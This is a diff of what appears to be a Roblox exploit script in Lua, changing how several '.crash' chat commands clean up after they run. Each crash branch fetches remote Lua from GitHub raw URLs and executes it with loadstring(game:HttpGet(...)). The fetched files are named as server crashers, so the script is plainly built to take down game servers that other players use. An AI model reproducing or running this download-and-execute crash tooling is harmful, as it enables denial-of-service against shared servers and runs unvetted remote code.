@@ -448,23 +448,17 @@ local function Initiate()
 					game:GetService("RunService"):Set3dRenderingEnabled(true)
 					Crashed = true
 					loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
-					coroutine.wrap(function()
-						setfpscap(60)
-						wait(1)
-						setfpscap(60)
-						wait(1)
-						setfpscap(60)
-						wait(1)
-						setfpscap(60)	
-					end)()
 					for Index,Var in pairs(CmdSettings) do
 						CmdSettings[Var] = nil
 					end
 					CmdSettings = {}
-					for Index,Connection in pairs(Connections) do
-						Index[Connection] = nil
-						Connection:Disconnect()
-					end
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)	
 				end
 			elseif Args[1] == ".crash" and Args[2] == "encrypt" and not Crashed then
 				local Player = GetPlayerFromString(Args[3],true)
@@ -475,23 +469,18 @@ local function Initiate()
 					game:GetService("RunService"):Set3dRenderingEnabled(true)
 					Crashed = true
 					loadstring(game:HttpGet("https://raw.githubusercontent.com/remorseW/encryptW/main/CustomEncryptCrasher.lua"))()
-					coroutine.wrap(function()
-						setfpscap(60)
-						wait(1)
-						setfpscap(60)
-						wait(1)
-						setfpscap(60)
-						wait(1)
-						setfpscap(60)	
-					end)()
+			
 					for Index,Var in pairs(CmdSettings) do
 						CmdSettings[Var] = nil
 					end
 					CmdSettings = {}
-					for Index,Connection in pairs(Connections) do
-						Index[Connection] = nil
-						Connection:Disconnect()
-					end
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)	
 				end
 			elseif Args[1] == ".crash" and Args[2] == "15min" and not Crashed then
 				local Player = GetPlayerFromString(Args[3],true)
@@ -502,23 +491,18 @@ local function Initiate()
 					game:GetService("RunService"):Set3dRenderingEnabled(true)
 					Crashed = true
 					loadstring(game:HttpGet("https://raw.githubusercontent.com/remorseW/encryptW/main/DahooSuperQuickCrash.lua"))()
-					coroutine.wrap(function()
-						setfpscap(60)
-						wait(1)
-						setfpscap(60)
-						wait(1)
-						setfpscap(60)
-						wait(1)
-						setfpscap(60)	
-					end)()
-					for Index,Var in pairs(CmdSettings) do
+ 					
+ 					for Index,Var in pairs(CmdSettings) do
 						CmdSettings[Var] = nil
 					end
 					CmdSettings = {}
-					for Index,Connection in pairs(Connections) do
-						Index[Connection] = nil
-						Connection:Disconnect()
-					end
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)	
 				end
 			elseif Args[1] == ".stopdrop" then
 				Drop(false)
